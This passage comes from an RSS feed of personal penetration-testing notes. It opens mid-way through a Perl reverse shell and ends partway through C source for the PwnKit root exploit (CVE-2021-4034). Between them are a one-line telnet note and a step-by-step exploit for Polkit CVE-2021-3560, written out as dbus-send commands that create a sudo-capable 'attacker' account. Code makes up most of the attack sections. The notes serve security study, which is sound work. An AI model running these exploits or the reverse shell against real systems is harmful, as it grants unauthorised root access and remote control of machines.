&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;open&lt;/span&gt;(STDOUT, &lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;gt;&amp;amp;S&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;open&lt;/span&gt;(STDERR, &lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;gt;&amp;amp;S&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;exec&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;/bin/sh -i&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;};&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Catch it with netcat or socat.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sat, 01 Apr 2023 02:57:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Perl.md</guid>
		</item>
		<item>
			<title>Telnet Protocol</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Telnet%20Protocol.md</link>
			<description>&lt;p&gt;The default port for &lt;code&gt;telnetd&lt;/code&gt; is TCP 23.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Sat, 01 Apr 2023 02:57:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Telnet%20Protocol.md</guid>
		</item>
		<item>
			<title>Exploiting Polkit</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Polkit.md</link>
			<description>&lt;h2 id=&quot;cve-2021-3560&quot;&gt;CVE-2021-3560&lt;/h2&gt;&lt;p&gt;This bug is a combination of a race condition and bad error handling. Basically:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Manually request an action that requires superuser access via DBus.&lt;/li&gt;&lt;li&gt;Kill &lt;code&gt;dbus-daemon&lt;/code&gt; &lt;em&gt;after&lt;/em&gt; Polkit has received the message but &lt;em&gt;before&lt;/em&gt; it responds (there's the race).&lt;/li&gt;&lt;li&gt;Polkit requests the user ID associated with the message, but since DBus has restarted it can't reference the original message ID and responds with an error.&lt;/li&gt;&lt;li&gt;Polkit mishandles the error, substituting 0 for the ID of the requesting user (there's the botched error handling).&lt;/li&gt;&lt;li&gt;Because the requesting user ID now appears to be root, Polkit just goes ahead and takes the action without issuing a challenge.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Ubuntu fixed with with version &lt;code&gt;0.105-26ubuntu1.1&lt;/code&gt; of the &lt;code&gt;policykit-1&lt;/code&gt; package (the last vulnerable version was &lt;code&gt;0.105-26ubuntu1&lt;/code&gt;).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/polkit&quot;&gt;TryHackMe: Polkit (CVE-2021-3560)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;(0)&lt;/strong&gt; Construct a message similar to the following:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dbus-send&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--system&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--dest&lt;/span&gt;=org.freedesktop.Accounts &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--type&lt;/span&gt;=method_call &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--print-reply&lt;/span&gt; /org/freedesktop/Accounts &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;org.freedesktop.Accounts.CreateUser&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;string&lt;/span&gt;:attacker &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;string&lt;/span&gt;:&lt;span class=&quot;st&quot;&gt;&amp;quot;Pentester Account&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;int32&lt;/span&gt;:1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The three parameters are:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;string:attacker&lt;/code&gt; - the name of the user to create.&lt;/li&gt;&lt;li&gt;&lt;code&gt;string:&quot;Pentester Account&quot;&lt;/code&gt; - the user &quot;description&quot; (GECOS field).&lt;/li&gt;&lt;li&gt;&lt;code&gt;int32:1&lt;/code&gt; - grant sudo access to the user.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;(1)&lt;/strong&gt; Begin by determining how long the message takes to execute on the target. This can be done with the &lt;code&gt;time&lt;/code&gt; command.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;time&lt;/span&gt; dbus-send &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--system&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--dest&lt;/span&gt;=org.freedesktop.Accounts &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--type&lt;/span&gt;=method_call &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--print-reply&lt;/span&gt; /org/freedesktop/Accounts &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;org.freedesktop.Accounts.CreateUser&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;string&lt;/span&gt;:attacker &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;string&lt;/span&gt;:&lt;span class=&quot;st&quot;&gt;&amp;quot;Pentester Account&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-9&quot;&gt;&lt;a href=&quot;#cb2-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;int32&lt;/span&gt;:1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;(2)&lt;/strong&gt; DBus needs to be killed approximately &lt;em&gt;halfway&lt;/em&gt; through this execution period. We &lt;em&gt;cannot&lt;/em&gt; wait for the application to return, so instead we background it.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dbus-send&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--system&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--dest&lt;/span&gt;=org.freedesktop.Accounts &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--type&lt;/span&gt;=method_call &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--print-reply&lt;/span&gt; /org/freedesktop/Accounts &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;#cb3-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;org.freedesktop.Accounts.CreateUser&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;#cb3-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;string&lt;/span&gt;:attacker &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-8&quot;&gt;&lt;a href=&quot;#cb3-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;string&lt;/span&gt;:&lt;span class=&quot;st&quot;&gt;&amp;quot;Pentester Account&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-9&quot;&gt;&lt;a href=&quot;#cb3-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;int32&lt;/span&gt;:1 &lt;span class=&quot;kw&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-10&quot;&gt;&lt;a href=&quot;#cb3-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;${TIME}&lt;/span&gt;s&lt;span class=&quot;kw&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;kill&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$!&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here &lt;code&gt;$TIME&lt;/code&gt; is approximately half the time measured in the previous step.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;(3)&lt;/strong&gt; ID the created user.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;id&lt;/span&gt; attacker&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;(4)&lt;/strong&gt; Create a new password hash for the user.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; passwd -6 &lt;span class=&quot;va&quot;&gt;$PASSWORD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;(5)&lt;/strong&gt; Pull the same trick as in step 3, but with setting the created user's password.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dbus-send&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-2&quot;&gt;&lt;a href=&quot;#cb6-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--system&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-3&quot;&gt;&lt;a href=&quot;#cb6-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--dest&lt;/span&gt;=org.freedesktop.Accounts &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-4&quot;&gt;&lt;a href=&quot;#cb6-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--type&lt;/span&gt;=method_call &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-5&quot;&gt;&lt;a href=&quot;#cb6-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--print-reply&lt;/span&gt; /org/freedesktop/Accounts/User&lt;span class=&quot;va&quot;&gt;$UID&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-6&quot;&gt;&lt;a href=&quot;#cb6-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;org.freedesktop.Accounts.User.SetPassword&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-7&quot;&gt;&lt;a href=&quot;#cb6-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;string&lt;/span&gt;:&lt;span class=&quot;st&quot;&gt;&amp;#39;$PASSWORD_HASH&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-8&quot;&gt;&lt;a href=&quot;#cb6-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;string&lt;/span&gt;:&lt;span class=&quot;st&quot;&gt;&amp;#39;Ask the pentester&amp;#39;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-9&quot;&gt;&lt;a href=&quot;#cb6-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;${TIME}&lt;/span&gt;s&lt;span class=&quot;kw&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;kill&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$!&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here &lt;code&gt;$UID&lt;/code&gt; is the user ID retrieved in step 4 (note that there's &lt;em&gt;no&lt;/em&gt; space between &lt;code&gt;User&lt;/code&gt; and the ID, so you'll be hitting an endpoint that looks something like &lt;code&gt;/org/freedesktop/Accounts/User1003&lt;/code&gt;), &lt;code&gt;$PASSWORD_HASH&lt;/code&gt; is the hash returned in step 5, and &lt;code&gt;$TIME&lt;/code&gt; is the same timing determined from step 3. The second &lt;code&gt;string&lt;/code&gt; being passed in the user password hint.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;(6)&lt;/strong&gt; Log in as the new user (probably via &lt;code&gt;su&lt;/code&gt;).&lt;/p&gt;&lt;h2 id=&quot;cve-2021-4034-pwnkit&quot;&gt;CVE-2021-4034 (&quot;Pwnkit&quot;)&lt;/h2&gt;&lt;p&gt;Quick-n-dirty Pwnkit exploit:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;/*&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-2&quot;&gt;&lt;a href=&quot;#cb7-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt; * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit&amp;#39;s pkexec (CVE-2021-4034) by Andris Raugulis &amp;lt;moo@arthepsy.eu&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-3&quot;&gt;&lt;a href=&quot;#cb7-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt; * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-4&quot;&gt;&lt;a href=&quot;#cb7-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt; */&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-5&quot;&gt;&lt;a href=&quot;#cb7-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-6&quot;&gt;&lt;a href=&quot;#cb7-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-7&quot;&gt;&lt;a href=&quot;#cb7-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-8&quot;&gt;&lt;a href=&quot;#cb7-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-9&quot;&gt;&lt;a href=&quot;#cb7-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; *shell = &lt;/span&gt;
&lt;span id=&quot;cb7-10&quot;&gt;&lt;a href=&quot;#cb7-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-11&quot;&gt;&lt;a href=&quot;#cb7-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-12&quot;&gt;&lt;a href=&quot;#cb7-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-13&quot;&gt;&lt;a href=&quot;#cb7-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-14&quot;&gt;&lt;a href=&quot;#cb7-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-15&quot;&gt;&lt;a href=&quot;#cb7-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-16&quot;&gt;&lt;a href=&quot;#cb7-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-17&quot;&gt;&lt;a href=&quot;#cb7-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;void gconv() {}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-18&quot;&gt;&lt;a href=&quot;#cb7-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-19&quot;&gt;&lt;a href=&quot;#cb7-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;void gconv_init() {&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-20&quot;&gt;&lt;a href=&quot;#cb7-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-21&quot;&gt;&lt;a href=&quot;#cb7-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;   setuid(0); setgid(0);&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-22&quot;&gt;&lt;a href=&quot;#cb7-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-23&quot;&gt;&lt;a href=&quot;#cb7-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;   seteuid(0); setegid(0);&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-24&quot;&gt;&lt;a href=&quot;#cb7-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-25&quot;&gt;&lt;a href=&quot;#cb7-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;   system(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &amp;#39;GCONV_PATH=.&amp;#39; &amp;#39;pwnkit&amp;#39;; /bin/sh&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-26&quot;&gt;&lt;a href=&quot;#cb7-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-27&quot;&gt;&lt;a href=&quot;#cb7-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;   exit(0);&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-28&quot;&gt;&lt;a href=&quot;#cb7-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
